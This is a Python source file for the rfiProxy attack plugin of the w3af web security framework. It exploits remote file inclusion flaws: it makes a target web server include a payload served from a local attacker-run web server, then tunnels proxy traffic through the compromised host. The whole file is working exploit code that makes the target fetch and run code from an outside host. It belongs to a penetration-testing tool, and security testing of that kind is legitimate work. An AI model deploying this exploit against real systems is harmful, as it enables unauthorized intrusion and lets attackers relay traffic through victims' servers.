'''
rfiProxy.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

from core.data.fuzzer.fuzzer import createRandAlNum

import core.controllers.outputManager as om
import core.data.kb.knowledgeBase as kb
import core.data.kb.config as cf
import core.data.parsers.urlParser as urlParser
from core.data.kb.shell import shell as shell

from core.controllers.w3afException import w3afException
from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin

import core.controllers.daemons.webserver as webserver
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from core.controllers.threads.w3afThread import w3afThread
from core.controllers.threads.threadManager import threadManagerObj as tm
import core.data.constants.w3afPorts as w3afPorts

# options
from core.data.options.option import option
from core.data.options.optionList import optionList

import time
import socket, urlparse, urllib
import os

#
# TODO: I dont like globals, please see TODO below.
#
url = ''
exploitData = ''
rfiConnGenerator = ''
# This separator is a Unique string used for parsing. 
RFI_SEPARATOR = createRandAlNum( 25 )
URLOPENER = None


class rfiProxy(baseAttackPlugin, w3afThread):
    '''
    Exploits remote file inclusions to create a proxy server.
    
    @author: Andres Riancho ( andres.riancho@gmail.com )    
    '''

    def __init__( self ):
        baseAttackPlugin.__init__(self)
        w3afThread.__init__( self )
        
        self._shell = None
        self._proxyAddress = '127.0.0.1'
        self._proxyPort = w3afPorts.RFIPROXY
        self._rfiConnGenerator = ''
        self._httpdPort = w3afPorts.RFIPROXY2
        
        self._proxy = None
        self._wS = None
        self._go = True
        
        self._url = None
        self._method = None
        self._exploitQs = None
        self._proxyPublicIP = cf.cf.getData( 'localAddress' )
        
    def fastExploit(self, url, method, data ):
        '''
        Exploits a web app with osCommanding vuln.
        
        @parameter url: A string containing the Url to exploit ( http://somehost.com/foo.php )
        @parameter method: A string containing the method to send the data ( post / get )
        @parameter data: A string containing data to send with a mark that defines
        which is the vulnerable parameter ( aa=notMe&bb=almost&cc=[VULNERABLE] )
        '''
        return self._shell
    
    def getAttackType(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''        
        return 'proxy'
        
    def getVulnName2Exploit( self ):
        '''
        This method should return the vulnerability name (as saved in the kb) to exploit.
        For example, if the audit.osCommanding plugin finds an vuln, and saves it as:
        
        kb.kb.append( 'osCommanding' , 'osCommanding', vuln )
        
        Then the exploit plugin that exploits osCommanding ( attack.osCommandingShell ) should
        return 'osCommanding' in this method.
        '''        
        return 'remoteFileInclude'
                
      
    def _generateShell( self, vuln ):
        '''
        @parameter vuln: The vuln to exploit.
        @return: True if the user can start using the proxy.
        '''
        # Set proxy parameters
        self._url = urlParser.uri2url( vuln.getURL() )
        self._method = vuln.getMethod()
        self._exploitData = vuln.getDc()
        self._variable = vuln.getVar()
        
        self.start2()
        
        p = proxy_rfi_shell( self._proxyAddress + ':' + str(self._proxyPort) )
        
        return p
        
    def stop(self):
        if self._running:
            self._proxy.server_close()
            self._go = False
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((self._proxyAddress, self._proxyPort))
                s.close()
            except:
                pass
            self._running = False
        
    def specific_user_input( self, command ):
        '''
        This method is called when a user writes a command in the shell and hits enter.
        
        Before calling this method, the framework calls the generic_user_input method
        from the shell class.

        @parameter command: The command to handle ( ie. "read", "exec", etc ).
        @return: The result of the command.
        '''
        if command != 'stop' and command != 'exit':
            message = 'Available commands:\n'
            message += 'stop              Terminate the proxy and web server processes used in this exploit.\n'
            message += 'exit              Return to previous menu, proxy will continue to work.\n'
            return message
        elif command == 'stop':
            if not self._running:
                message = 'No processes running.'
            else:
                self.stop()
                message = 'Stopping processes.'
            return message
        elif command == 'exit':
            if self._running:
                message = 'Proxy will keep running in background.'
            else:
                message = ''
            return message

    def run(self):
        '''
        Starts the http server that will become a proxy.
        
        '''
        if self._rfiConnGenerator == '':
            # If user failed to configure self._rfiConnGenerator we will run a webserver
            # and configure the _rfiConnGenerator attr for him
            om.out.information('Running a local httpd to serve the RFI connection generator to remote web app.')
            webroot = os.path.join('plugins', 'attack', 'rfiProxy')
            webserver.start_webserver(self._proxyPublicIP, self._httpdPort, webroot)
            self._rfiConnGenerator = 'http://' + self._proxyPublicIP + ':' + str(self._httpdPort) + '/rfip.txt'
            
        ### TODO: I really dislike this:
        global url
        global exploitData
        global variable
        global rfiConnGenerator
        #    We should change it to something like this:
        #
        #>>> import new
        #>>> class A(object):
        #       def foo(self):
        #               print self.x
        #>>> B = new.classobj('B', (A,), {'x': 1})
        #>>> b = B()
        #>>> b.foo()
        #1
        #>>>
        #
        #    Kudos to Javier for the nice solution :)
        url = self._url
        exploitData = self._exploitData
        rfiConnGenerator = self._rfiConnGenerator
        variable = self._variable
        
        self._proxy = HTTPServer((self._proxyAddress, self._proxyPort ),  w3afProxyHandler )
        message = 'Proxy server running on '+ self._proxyAddress + ':'+ str(self._proxyPort) +' .'
        message += ' You may now configure this proxy in w3af or your browser. '
        om.out.information( message )
        
        self._running = True
        while self._go:
            try:
                self._proxy.handle_request()
            except:
                self._proxy.server_close()
    
    def getOptions(self):
        '''
        @return: A list of option objects for this plugin.
        '''
        desc_1 = 'IP address that the proxy will use to receive requests'
        option_1 = option('proxyAddress', self._proxyAddress, desc_1, 'string')
        
        desc_2 = 'Port that the proxy will use to receive requests'
        option_2 = option('proxyPort', self._proxyPort, desc_2, 'integer')
        
        desc_3 = 'Port that the local httpd will listen on.'
        help_3 = 'When exploiting a remote file include for generating a proxy, w3af can'
        help_3 += ' use a local web server to serve the included file. This setting will'
        help_3 += ' configure the TCP port where this webserver listens.'
        option_3 = option('httpdPort', self._httpdPort, desc_3, 'integer', help=help_3)

        desc_4 = 'This is the ip that the remote server will connect to in order to'
        desc_4 += ' retrieve the file inclusion payload "rfip.txt".'
        help_4 = 'When exploiting a remote file include for generating a proxy, w3af can use'
        help_4 += ' a local web server to serve the included file. This setting will configure'
        help_4 += ' the IP address where this webserver listens.'
        option_4 = option('proxyPublicIP', self._proxyPublicIP, desc_4, 'string',  help=help_4)

        desc_5 = 'URL for the remote file inclusion connection generator.'
        help_5 = 'If left blank, a local webserver will be runned at proxyPublicIP:httpdPort'
        help_5 += ' and the connection generator will be served to the remote web application'
        help_5 +=' this way.'
        option_5 = option('rfiConnGenerator', self._rfiConnGenerator, desc_5, 'integer', help=help_5)

        options = optionList()
        options.add(option_1)
        options.add(option_2)
        options.add(option_3)
        options.add(option_4)
        options.add(option_5)
        return options

        
    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack plugin.
        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
        return a root shell.
        '''
        return 0.0
        
    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptions().
        
        @parameter optionsMap: A dictionary with the options for the plugin.
        @return: No value is returned.
        ''' 
        self._proxyAddress = optionsMap['proxyAddress'].getValue()
        self._proxyPort = optionsMap['proxyPort'].getValue()
        self._httpdPort = optionsMap['httpdPort'].getValue()
        self._proxyPublicIP = optionsMap['proxyPublicIP'].getValue()
        self._rfiConnGenerator = optionsMap['rfiConnGenerator'].getValue()
    
    def setUrlOpener( self, urlOpener):
        '''
        This method should not be overwritten by any plugin (but you are free to do it, for example
        a good idea is to rewrite this method to change the UrlOpener to do some IDS evasion technic).
        
        This method takes a CustomUrllib object as parameter and assigns it to itself. 
        Then, on the testUrl method you use self.CustomUrlOpener._custom_urlopen(...) 
        to open a Url and you are sure that the plugin is using the user supplied
        settings (proxy, user agent, etc).
        
        @return: No value is returned.
        '''
        global URLOPENER
        URLOPENER = urlOpener
        
    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits remote file inclusion vulnerabilities and returns a proxy object, proxy
        objects listen on a local port, and create a tunnel from the local machine to the remote
        end, where the connections are actually created.
        
        Five configurable parameters exist:
            - proxyAddress
            - proxyPort
            - httpdPort
            - proxyPublicIP
            - rfiConnGenerator
        '''
        
class proxy_rfi_shell(shell):
    
    def __init__(self, proxy_url):
        self._proxy_url = proxy_url
    
    def generic_user_input( self, command ):
        '''
        This method is called when a user writes a command in the shell and hits enter.
        
        @parameter command: The command to handle ( ie. "read", "exec", etc ).
        @return: The result of the command.
        '''
        msg = 'This is a place holder. You should use your browser to interact with this plugin.'
        return msg
    
    def end( self ):
        om.out.debug('xssShell cleanup complete.')
        
    def getName( self ):
        return 'proxy_rfi_shell'
    
    def _identifyOs(self):
        return 'remote_file_inclusion_proxy'
        
    def __repr__( self ):
        return '<'+self.getName()+' object (Use proxy: "'+self._proxy_url+'")>'
        
    def getRemoteSystem( self ):
        return 'browser'

    def getRemoteUser( self ):
        return 'user'
        
    def getRemoteSystemName( self ):
        return 'browser'
        
    __str__ = __repr__

class w3afProxyHandler(BaseHTTPRequestHandler):

    def _work( self, host, port, send, proxyClientConnection ):
        
        postDataDict = {}
        postDataDict['rfipsend'] = send
        postDataDict['rfihost'] = host
        postDataDict['rfiport'] = port
        postDataDict['rfipsep'] = RFI_SEPARATOR
        postdata = urllib.urlencode( postDataDict )
        
        QueryStringDict = exploitData
        QueryStringDict[ variable ] = rfiConnGenerator
        qs = str( QueryStringDict )
        
        completeUrl = url + '?' + qs
        #req = urllib2.Request( completeUrl , postdata )

        try:
            response = URLOPENER.POST( completeUrl, postdata )
            #response = urllib2.urlopen( req )
        except w3afException, e:
            proxyClientConnection.close()
            om.out.error( 'Oops! Error when proxy tried to open remote site: ' + str(e) )
        else:
            page = response.getBody()
            theStart = page.find( RFI_SEPARATOR )
            theEnd = page.rfind( RFI_SEPARATOR )
            page = page[ theStart + len(RFI_SEPARATOR): theEnd ]
            page = page[ page.find('HTTP'):]
            proxyClientConnection.send( page )
            proxyClientConnection.close()

    def __init__( self, a, b, c):
        self._tm = tm
        BaseHTTPRequestHandler.__init__( self, a, b, c )
        
    def handle_one_request(self):
        """
        Handle a single HTTP request.
        """
        self.raw_requestline = self.rfile.readline()
        if not self.raw_requestline:
            self.close_connection = 1
            return
        if not self.parse_request(): # An error code has been sent, just exit
            return

        words = self.raw_requestline.split('\n')[0].split()
        if len( words ) == 3:
            command, url, version = words
            (scm, netloc, path, params, query, fragment) = urlparse.urlparse(url)
            if scm != 'http':
                msg = 'Remote file inclusion proxy has no https support.'
                msg += ' Contribute <a href="http://w3af.sourceforge.net/">here</a>'
                self.send_error(501, msg)
                return
            else:
                split_netloc = netloc.split(':')
                port = 80
                if len( split_netloc ) == 2:
                    port = split_netloc[1]
                host = split_netloc[0]
        else:
            return

        del self.headers['Proxy-Connection']
        del self.headers['keep-alive']
        self.headers['connection'] = 'close'
        raw_request = self.raw_requestline
        for header in self.headers.keys():
            raw_request += header+': '
            raw_request += self.headers.getheader(header)
            raw_request += '\r\n'
        try:
            length = int(self.headers.getheader('content-length'))
        except:
            pass
        else:
            raw_request += '\r\n\r\n'
            raw_request += self.rfile.read(length)
        
        raw_request += '\r\n\r\n'
        
        proxyClientConnection = self.connection
        #targs = ( host, port, raw_request, proxyClientConnection )
        #self._tm.startFunction( target=self._work, args=targs, ownerObj=self )
        self._work( host, port, raw_request, proxyClientConnection )
